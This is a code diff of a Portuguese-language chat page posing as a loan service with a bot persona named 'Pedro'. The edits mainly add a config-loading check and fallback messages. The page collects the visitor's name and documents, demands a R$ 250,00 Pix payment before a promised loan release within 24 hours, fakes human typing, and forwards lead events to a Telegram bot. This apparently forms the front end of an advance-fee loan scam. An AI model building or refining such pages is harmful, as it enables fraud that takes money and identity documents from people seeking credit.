@@ -244,6 +244,7 @@
     </style>
   </head>
   <body>
+    <!-- Carrega config.js primeiro -->
     <script src="config.js"></script>
     <div class="chat-container">
       <div class="chat-header">
@@ -280,11 +281,19 @@
     </div>
 
     <script>
-      const BOT_NAME = window.CONFIG?.botName || "Assistente";
-      const BOT_PHOTO = window.CONFIG?.botPhoto || "imagens/perfil.jpg";
-      const MEU_TOKEN = window.CONFIG?.telegramToken || "";
-      const MEU_CHAT_ID = window.CONFIG?.telegramChatId || "";
-      const MSG = window.CONFIG?.mensagens || {};
+      // ✅ Garante que config.js foi carregado
+      if (typeof window.CONFIG === 'undefined' || window.CONFIG === null) {
+        console.error("⚠️ config.js não carregado! Verifique o caminho.");
+        document.getElementById("header-name").textContent = "Erro: config.js ausente";
+        document.getElementById("messages").innerHTML = "<div style='padding:20px;text-align:center;color:#999'>Erro: config.js não encontrado. Verifique se 'config.js' está na mesma pasta.</div>";
+        return;
+      }
+
+      const BOT_NAME = window.CONFIG.botName || "Assistente";
+      const BOT_PHOTO = window.CONFIG.botPhoto || "imagens/perfil.jpg";
+      const MEU_TOKEN = window.CONFIG.telegramToken || "";
+      const MEU_CHAT_ID = window.CONFIG.telegramChatId || "";
+      const MSG = window.CONFIG.mensagens || {};
 
       let idConversa = localStorage.getItem("emprestimo_id_conv") || "conv_" + Date.now();
       localStorage.setItem("emprestimo_id_conv", idConversa);
@@ -292,6 +301,7 @@
       let nomeLead = localStorage.getItem("emprestimo_nome_" + idConversa) || "";
       let estadoConversa = localStorage.getItem("emprestimo_estado_" + idConversa) || "inicio";
 
+      // === Controle de mensagens já processadas ===
       let updatesProcessados = JSON.parse(localStorage.getItem("updates_processados_" + idConversa) || "[]");
 
       const statusEl = document.getElementById("status");
@@ -496,7 +506,8 @@
             showTypingBelow(true);
             setTimeout(() => {
               showTypingBelow(false);
-              addMessage(typeof MSG.pedirNome === 'function' ? MSG.pedirNome() : MSG.pedirNome, false, true);
+              const txt = typeof MSG.pedirNome === 'function' ? MSG.pedirNome() : MSG.pedirNome || "Olá! Qual é o seu nome?";
+              addMessage(txt, false, true);
             }, 1000);
             return;
           }
@@ -508,8 +519,8 @@
           setTyping("typing");
           setTimeout(() => {
             setTyping("idle");
-            const msgText = typeof MSG.apresentacao === 'function' ? MSG.apresentacao(nomeLead) : MSG.apresentacao.replace("{nome}", nomeLead);
-            addMessage(msgText, false, true);
+            const txt = typeof MSG.apresentacao === 'function' ? MSG.apresentacao(nomeLead) : MSG.apresentacao || "Prazer! Sou o Pedro.";
+            addMessage(txt, false, true);
           }, 1500);
           return;
         }
@@ -523,23 +534,23 @@
             setTyping("typing");
             setTimeout(() => {
               setTyping("idle");
-              const msgText = typeof MSG.documentos === 'function' ? MSG.documentos(nomeLead) : MSG.documentos.replace("{nome}", nomeLead);
-              addMessage(msgText, false, true);
+              const txt = typeof MSG.documentos === 'function' ? MSG.documentos(nomeLead) : MSG.documentos || "Envie os documentos...";
+              addMessage(txt, false, true);
             }, 1000);
           } else if (msgLower === "não tenho interesse") {
             enviarTelegram("SEM_INTERESSE", `${nomeLead} recusou`);
             setTyping("typing");
             setTimeout(() => {
               setTyping("idle");
-              const msgText = typeof MSG.semInteresse === 'function' ? MSG.semInteresse(nomeLead) : MSG.semInteresse.replace("{nome}", nomeLead);
-              addMessage(msgText, false, true);
+              const txt = typeof MSG.semInteresse === 'function' ? MSG.semInteresse(nomeLead) : MSG.semInteresse || "Tudo bem!";
+              addMessage(txt, false, true);
             }, 1000);
           } else {
             showTypingBelow(true);
             setTimeout(() => {
               showTypingBelow(false);
-              const msgText = typeof MSG.padrao === 'function' ? MSG.padrao(nomeLead) : MSG.padrao.replace("{nome}", nomeLead);
-              addMessage(msgText, false, true);
+              const txt = typeof MSG.padrao === 'function' ? MSG.padrao(nomeLead) : MSG.padrao || "Responda com sim ou não.";
+              addMessage(txt, false, true);
             }, 1000);
           }
           return;
@@ -554,8 +565,8 @@
             setTyping("typing");
             setTimeout(() => {
               setTyping("idle");
-              const msgText = typeof MSG.checkoutLink === 'function' ? MSG.checkoutLink(nomeLead) : MSG.checkoutLink.replace("{nome}", nomeLead);
-              addMessage(msgText, false, true);
+              const txt = typeof MSG.checkoutLink === 'function' ? MSG.checkoutLink(nomeLead) : MSG.checkoutLink || "Acesse o checkout.";
+              addMessage(txt, false, true);
             }, 1000);
             return;
           }
@@ -594,45 +605,48 @@
       updateStatus();
       statusTimer = setTimeout(updateStatus, 15000);
 
+      // Início automático
       if (!nomeLead && estadoConversa === "inicio") {
         setTimeout(() => {
-          const msgText = typeof MSG.pedirNome === 'function' ? MSG.pedirNome() : MSG.pedirNome;
-          addMessage(msgText, false, true);
+          const txt = typeof MSG.pedirNome === 'function' ? MSG.pedirNome() : MSG.pedirNome || "Olá! Qual é o seu nome?";
+          addMessage(txt, false, true);
         }, 500);
       } else if (estadoConversa === "apresentacao") {
         setTimeout(() => {
-          const msgText = typeof MSG.apresentacao === 'function' ? MSG.apresentacao(nomeLead) : MSG.apresentacao.replace("{nome}", nomeLead);
-          addMessage(msgText, false, true);
+          const txt = typeof MSG.apresentacao === 'function' ? MSG.apresentacao(nomeLead) : MSG.apresentacao || "Prazer!";
+          addMessage(txt, false, true);
         }, 500);
       } else if (estadoConversa === "documentos") {
         setTimeout(() => {
-          const msgText = typeof MSG.documentos === 'function' ? MSG.documentos(nomeLead) : MSG.documentos.replace("{nome}", nomeLead);
-          addMessage(msgText, false, true);
+          const txt = typeof MSG.documentos === 'function' ? MSG.documentos(nomeLead) : MSG.documentos || "Envie os documentos...";
+          addMessage(txt, false, true);
         }, 500);
       } else if (estadoConversa === "checkout") {
         setTimeout(() => {
-          const msgText = typeof MSG.checkoutLink === 'function' ? MSG.checkoutLink(nomeLead) : MSG.checkoutLink.replace("{nome}", nomeLead);
-          addMessage(msgText, false, true);
+          const txt = typeof MSG.checkoutLink === 'function' ? MSG.checkoutLink(nomeLead) : MSG.checkoutLink || "Acesse o checkout.";
+          addMessage(txt, false, true);
         }, 500);
       }
 
-      // ✅ NOVA LÓGICA: REDIRECIONAMENTO DO EVO PAY
+      // ✅ CORREÇÃO FINAL: redirecionamento de pagamento
       if (status === "pago") {
         setTimeout(() => {
           if (nomeLead) {
             estadoConversa = "aguardando_comprovante";
             localStorage.setItem("emprestimo_estado_" + idConversa, estadoConversa);
-            addMessage(`✅ Pagamento de <b>R$ 250,00</b> confirmado, ${nomeLead}!<br><br>
+            const msg = `✅ Pagamento de <b>R$ 250,00</b> confirmado, ${nomeLead}!<br><br>
             Agora, por favor, envie o <b>comprovante do Pix</b> aqui mesmo neste chat.<br>
-            Seu empréstimo será liberado em até <b>24 horas</b> após análise.`, false, true);
+            Seu empréstimo será liberado em até <b>24 horas</b> após análise.`;
+            addMessage(msg, false, true);
           } else if (nomeParam) {
             nomeLead = decodeURIComponent(nomeParam);
             localStorage.setItem("emprestimo_nome_" + idConversa, nomeLead);
             estadoConversa = "aguardando_comprovante";
             localStorage.setItem("emprestimo_estado_" + idConversa, estadoConversa);
-            addMessage(`✅ Pagamento de <b>R$ 250,00</b> confirmado, ${nomeLead}!<br><br>
+            const msg = `✅ Pagamento de <b>R$ 250,00</b> confirmado, ${nomeLead}!<br><br>
             Agora, por favor, envie o <b>comprovante do Pix</b> aqui mesmo neste chat.<br>
-            Seu empréstimo será liberado em até <b>24 horas</b> após análise.`, false, true);
+            Seu empréstimo será liberado em até <b>24 horas</b> após análise.`;
+            addMessage(msg, false, true);
           } else {
             addMessage(`✅ Pagamento de <b>R$ 250,00</b> confirmado!<br><br>
             Por favor, envie o <b>comprovante do Pix</b> aqui mesmo neste chat.<br>
